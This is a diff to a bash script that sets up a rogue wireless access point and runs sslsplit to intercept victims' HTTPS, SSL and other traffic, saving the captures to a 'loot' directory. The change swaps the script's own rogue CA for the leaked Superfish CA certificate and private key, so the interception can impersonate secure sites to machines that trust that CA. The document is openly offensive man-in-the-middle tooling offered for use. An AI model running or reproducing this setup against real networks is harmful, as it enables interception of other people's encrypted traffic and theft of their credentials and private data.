@@ -1,9 +1,13 @@
 #!/bin/bash
 #info: https://sensepost.com/blog/2013/rogue-access-points-a-how-to/
 source $(cd $(dirname $0); pwd -P)/_custom_functions.sh
-
 upstream=eth0
 phy=wlan0
+
+export ssl_cert_pem=$share/crackpkcs8/Superfish_CA.pem
+export ssl_cert_key=$share/crackpkcs8/Superfish_CA.key
+#ssl_cert_pem=$share/cert/rogue-ca.pem
+#ssl_cert_key=$share/cert/rogue-ca.key
 
 check_ap_mode(){
  if ! iw list | grep 'AP$'>/dev/null
@@ -71,7 +75,7 @@ start_sslstrip(){
 }
 
 start_sslsplit(){
-        sslsplit -D -P -Z -S $loot/sslsplit -c $share/cert/rogue-ca.pem -k $share/cert/rogue-ca.key -O -l $loot/sslsplit-connect.log.`date "+%s"` \
+        sslsplit -D -P -Z -S $loot/sslsplit -c $ssl_cert_pem -k $ssl_cert_key -O -l $loot/sslsplit-connect.log.`date "+%s"` \
          https 0.0.0.0 10443 \
          http 0.0.0.0 10080 \
          ssl 0.0.0.0 10993 \
@@ -300,7 +304,7 @@ echo -e "$txtgrn [*] Starting nat-firewall $endclr"
 
 #SSLSplit
  echo Starting sslsplit
- sslsplit -D -Z -S $loot/sslsplit -c $share/cert/rogue-ca.pem -k $share/cert/rogue-ca.key -O -l $loot/sslsplit-connect.log.$DATENOW \
+ sslsplit -D -Z -S $loot/sslsplit -c $ssl_cert_pem -k $ssl_cert_key -O -l $loot/sslsplit-connect.log.$DATENOW \
  https 0.0.0.0 10443 \
  ssl 0.0.0.0 10993 \
  tcp 0.0.0.0 10143 \
